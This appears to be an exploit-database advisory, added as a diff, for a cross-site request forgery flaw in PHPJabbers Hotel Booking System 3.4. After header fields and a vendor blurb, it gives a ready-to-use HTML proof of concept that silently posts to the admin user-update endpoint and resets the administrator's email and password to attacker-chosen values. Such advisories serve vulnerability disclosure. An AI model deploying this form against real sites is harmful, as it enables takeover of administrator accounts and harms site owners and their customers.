@@ -1,0 +1,45 @@
+# Exploit Title: Admin Account take over Via CSRF
+# Google Dork: N/A
+# Date: 17-12-2018
+# Exploit Author: Sainadh Jamalpur
+# Vendor Homepage: https://www.phpjabbers.com/hotel-booking-system/
+# Software Link: https://demo.phpjabbers.com/1545033057_422/index.php?controller=pjAdmin&action=pjActionIndex
+# Version: 3.4
+# Tested on: Windows x64/ Kali linux x64
+# CVE : N/A
+
+************************Description:**********************
+
+The online hotel reservation system is built in PHP and uses MySQL to
+store data. The script provides a powerful room booking and reservation
+management functionality and allows you to install a clear
+call-to-action tool on your hotel website which will impact conversions
+and increase bookings. Our room booking system is highly customizable
+and compatible with various website types.
+
+*************************Vulnerability Description:****************
+ An attacker can take the admin account via sending the Malicious link
+to the authenticated user then the Victim clicks on the malicious link
+then the admin password is change
+
+************************************
+PoC**************************************
+
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://site.com/admin/index.php?controller=pjAdminUsers&action=pjActionUpdate"
+method="POST">
+      <input type="hidden" name="user&#95;update" value="1" />
+      <input type="hidden" name="id" value="1" />
+      <input type="hidden" name="role&#95;id" value="1" />
+      <input type="hidden" name="email" value="admin&#64;admin&#46;com" />
+      <input type="hidden" name="password" value="pass1234" />
+      <input type="hidden" name="name" value="Administrator" />
+      <input type="hidden" name="phone" value="" />
+      <input type="hidden" name="status" value="T" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
